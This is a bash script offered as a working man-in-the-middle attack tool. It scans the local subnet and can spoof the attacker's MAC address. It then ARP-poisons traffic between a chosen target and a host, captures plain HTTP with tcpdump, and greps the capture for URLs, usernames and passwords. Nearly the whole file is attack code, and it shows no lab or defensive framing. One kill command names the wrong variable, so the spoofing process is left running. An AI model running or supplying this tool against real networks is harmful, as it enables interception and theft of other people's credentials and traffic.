#!/bin/bash

#Colors
green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

function checkRoot(){
if [ "$EUID" -ne 0 ];then
  echo -e "\n${red}[!] You are not root. Please, execute the program as root, as it needs root privileges!${end}\n"
  exit 1
fi 
}

checkRoot

function checkNetSettings(){
  if [ "$(cat /proc/sys/net/ipv4/ip_forward)" -ne "1" ]; then
    echo -e "\n${red}[!] IP Forwarding is DISABLED:${end}"
    echo -e "\n\t${gray}sudo sysctl -w net.ipv4.ip_forward=1${end}\n"
    exit 1
  fi 

  forward_policy=$(sudo iptables -L FORWARD -n | grep "Chain FORWARD" | awk '{print $4}')
  if [ "$forward_policy" != "ACCEPT)" ]; then 
    echo -e "\n${red}[!] iptables FORWARD policy is not ACCEPT.${end}"
    echo -e "\n\t${gray}sudo iptables --policy FORWARD ACCEPT${end}\n"
    exit 1
  fi
}

function helpPanel(){
  echo -e "\n${yellow}[+]${end}${gray} Usage:${end}"
  echo -e "\n\t${purple}-t${end}${gray} [target]${end}${purple} -r${end}${gray} [host]${end}${purple} -i${end}${gray} [interface]${end}${purple} -o${end}${gray} [time]"
  echo -e "\n\t${purple}-s${end}${gray}) Shows the hosts UP in the network.${end}"
  echo -e "\t${purple}-i${end}${gray}) Sets the interface used (Wi-Fi Device).${end}"
  echo -e "\t${purple}-t${end}${gray}) Selects the target (IP Address).${end}"
  echo -e "\t${purple}-r${end}${gray}) Selects the host.${end}"
  echo -e "\t${purple}-o${end}${gray}) Sets the time of the spoofing (10s/30m/...).${end}"
  echo -e "\t${purple}-h${end}${gray}) Shows the help panel.${end}\n"
}

checkNetSettings

function ctrl_c(){
  sudo macchanger -p $interface &> /dev/null # Resetting the MAC Adress 
  echo -e "\n${red}[!] Terminating program...${end}\n"
  tput cnorm; exit 1
}

# Ctrl + C 
trap ctrl_c INT

# Variables
IP=$(ifconfig | head -n 2 | grep "inet" | awk '{print $2}')
Base_IP=$(echo "$IP" | cut -d '.' -f1-3)

function scanning_hosts(){
  echo -e "\n${yellow}[+]${end}${gray} The following hosts are up:${end}\n"
  tput civis
  tmp_file=$(mktemp)

  for i in $(seq 1 256); do 
    (
      target="$Base_IP.$i"

      ping -c 1 -W 1.5 "$target" &> /dev/null

      if [ $? -eq 0 ]; then
        echo "$target" >> "$tmp_file"
      fi
    ) &
  done 

  wait 

  tput cnorm

  sort -t '.' -k4 -n "$tmp_file" | while read ip; do 
    echo -e "\t${green}*) $ip"
  done

  rm "$tmp_file"
}

function arping(){
  if ! command -v arpspoof &> /dev/null; then
    echo -e "\n${red}[!] You need to install arpspoof:\n${end}"
    echo -e "\t${gray}sudo apt install arpspoof${end}\n"
    exit 1

  elif ! command -v tcpdump &> /dev/null; then
    echo -e "\n${red}[!] You need to install tcpdump:\n${end}"
    echo -e "\t${gray}sudo apt install tcpdump${end}\n"
    exit 1

  else 
    echo -ne "\n${yellow}[+]${end}${gray} Do you want to change your MAC Address? (yes/no) ${end}" && read answer
    
    if [ "$answer" == "yes" ] || [ "$answer" == "Yes" ] || [ "$answer" == "Y" ] || [ "$answer" == "y" ]; then

      tput civis
      # MAC Address before
      mac_address=$(macchanger -s $interface | grep "Current MAC:" | awk '{print $3}') 
      echo -e "\n\t${gray}*) Current MAC Address --> $mac_address${end}${yellow} ${end}"

      sudo ifconfig $interface down 
      sudo macchanger --mac="aa:bb:cc:44:55:66" $interface &> /dev/null 
      sudo ifconfig $interface up

      # MAC Address after
      mac_address=$(macchanger -s $interface | grep "Current MAC:" | awk '{print $3}')
      echo -e "\t${gray}*)${end}${yellow} New MAC Address ${end}${gray}-->${end}${yellow} $mac_address${end}"

      echo -e "\n${yellow}[+]${end}${gray} Initiating spoofing to${end}${yellow} $target${end}${gray} with duration ${yellow}$time${end}"
      sudo arpspoof -i $interface -t $target -r $host &> /dev/null & 
      ARP_SPOOF=$!

      sudo tcpdump -i $interface -A -s 0 port 80 2>/dev/null > traffic_output.log &
      TCPDUMP_SPOOF=$!

      # Monitor to check whether receives information or not
      (
        prev_size=0
        while sleep 2; do
          if [ -f traffic_output.log ]; then
            new_size=$(stat -c%s traffic_output.log)
            if [ "$new_size" -gt "$prev_size" ]; then
              echo -e "\n${yellow}[+]${end}${gray} Info added to${end}${yellow} traffic_output.log${end}"
              prev_size=$new_size
            fi 
          fi 
        done 
      ) & 
      monitor_pid=$!
      
      # Time taken for the sniffing
      sleep "$time"

      # Process killers
      kill "$monitor_pid" 2>/dev/null
      sudo kill -2 $TCPDUMP_SPOOF 2>/dev/null
      sudo kill $ARPSPOOF_SPOOF 2>/dev/null

      echo -e "\n${yellow}[+]${end}${gray} Packets captured in${end}${yellow} traffic_output.log${end}"
      tput cnorm

      echo -ne "\n${yellow}[+]${end}${gray} Do you want to see the URLs? (yes/no) ${end}" && read answer2

      tput civis
      sleep 1
      tput cnorm

      if [ "$answer2" == "yes" ] || [ "$answer2" == "Yes" ] || [ "$answer2" == "Y" ] || [ "$answer2" == "y" ]; then
        if grep -aEi '\b(host|url)[ ]*[=:][ ]*[^ ]+' traffic_output.log > /dev/null; then
          echo -e "\n${yellow}[+]${end}${gray} URLs detected:${end}\n"  
          grep -aEi '\b(host|url)[ ]*[=:][ ]*[^ ]+' traffic_output.log 

        else 
          echo -e "\n${red}[!] No URLs detected..."
        fi 
      fi 

      echo -ne "\n${yellow}[+]${end}${gray} Do you want to see the usernames and passwords? (yes/no) ${end}" && read answer3
      if [ "$answer3" == "yes" ] || [ "$answer3" == "Yes" ] || [ "$answer3" == "Y" ] || [ "$answer3" == "y" ]; then
        if grep -aEi '(\w*user(name)?\w*|\w*pass(word)?\w*)[ ]*[=:][ ]*[^& \r\n]+' traffic_output.log > /dev/null; then 
          echo -e "\n${yellow}[+]${end}${gray} Users/Passwords detected:${end}\n"
          grep -aEi '(\w*user(name)?\w*|\w*pass(word)?\w*)[ ]*[=:][ ]*[^& \r\n]+' traffic_output.log
          sudo macchanger -p $interface &> /dev/null
        else 
          echo -e "\n${red}[!] No Users/Passwords detected...${end}\n"
          sudo macchanger -p $interface &> /dev/null
          exit 1
        fi 
      else 
        sudo macchanger -p $interface &> /dev/null
        exit 1
      fi 

    else 
      tput civis
      echo -e "\n${yellow}[+]${end}${gray} Initiating spoofing to${end}${yellow} $target${end}${gray} with a duration of ${yellow}$time${end}"
      sudo arpspoof -i $interface -t $target -r $host &> /dev/null & 
      ARP_SPOOF=$!

      sudo tcpdump -i $interface -A -s 0 port 80 2>/dev/null > traffic_output.log &
      TCPDUMP_SPOOF=$!

      # Monitor to check whether receives information or not
      (
        prev_size=0
        while sleep 2; do
          if [ -f traffic_output.log ]; then
            new_size=$(stat -c%s traffic_output.log)
            if [ "$new_size" -gt "$prev_size" ]; then
              echo -e "\n${yellow}[+]${end}${gray} Info added to${end}${yellow} traffic_output.log${end}"
              prev_size=$new_size
            fi 
          fi 
        done 
      ) & 
      monitor_pid=$!
      
      # Time taken for the sniffing
      sleep "$time"

      # Process killers
      kill "$monitor_pid" 2>/dev/null
      sudo kill -2 $TCPDUMP_SPOOF 2>/dev/null
      sudo kill $ARPSPOOF_SPOOF 2>/dev/null

      echo -e "\n${yellow}[+]${end}${gray} Packets captured in${end}${yellow} traffic_output.log${end}"

      tput cnorm 

      echo -ne "\n${yellow}[+]${end}${gray} Do you want to see the URLs? (yes/no) ${end}" && read answer2
      tput civis
      sleep 1
      tput cnorm

      if [ "$answer2" == "yes" ] || [ "$answer2" == "Yes" ] || [ "$answer2" == "Y" ] || [ "$answer2" == "y" ]; then
        if grep -aEi '\b(host|url)[ ]*[=:][ ]*[^ ]+' traffic_output.log > /dev/null; then
          echo -e "\n${yellow}[+]${end}${gray} URLs detected:${end}\n"  
          grep -aEi '\b(host|url)[ ]*[=:][ ]*[^ ]+' traffic_output.log 

        else 
          echo -e "\n${red}[!] No URLs detected..."
        fi 
      fi 

      echo -ne "\n${yellow}[+]${end}${gray} Do you want to see the usernames and passwords? (yes/no) ${end}" && read answer3
      if [ "$answer3" == "yes" ] || [ "$answer3" == "Yes" ] || [ "$answer3" == "Y" ] || [ "$answer3" == "y" ]; then
        if grep -aEi '(\w*user(name)?\w*|\w*pass(word)?\w*)[ ]*[=:][ ]*[^& \r\n]+' traffic_output.log > /dev/null; then 
          echo -e "\n${yellow}[+]${end}${gray} Users/Passwords detected:${end}\n"
          grep -aEi '(\w*user(name)?\w*|\w*pass(word)?\w*)[ ]*[=:][ ]*[^& \r\n]+' traffic_output.log
          sudo macchanger -p $interface &> /dev/null
        else 
          echo -e "\n${red}[!] No Users/Passwords detected...${end}\n"
          sudo macchanger -p $interface &> /dev/null
          exit 1
        fi 
      else 
        sudo macchanger -p $interface &> /dev/null
        exit 1
      fi 
    fi 
  fi 
}

# Indicators
declare -i parameter_counter=0

# Clerks
declare -i ip_clerk=0
declare -i host_clerk=0
declare -i interface_clerk=0
declare -i time_clerk=0

while getopts "t:r:i:o:sh" arg; do 
  case $arg in 
    s) let parameter_counter+=1;;
    t) target="$OPTARG"; ip_clerk=1;;
    r) host="$OPTARG"; host_clerk=1;;
    i) interface="$OPTARG"; interface_clerk=1;;
    o) time="$OPTARG"; time_clerk=1;;
    h) ;;
  esac
done

if [ $parameter_counter -eq 1 ]; then
  scanning_hosts
elif [ "$ip_clerk" -eq 1 ] && [ "$host_clerk" -eq 1 ] && [ "$interface_clerk" -eq 1 ] && [ "$time_clerk" -eq 1 ];then
  arping $ip_clerk $host_clerk $interface_clerk $time_clerk
else 
  helpPanel
fi 

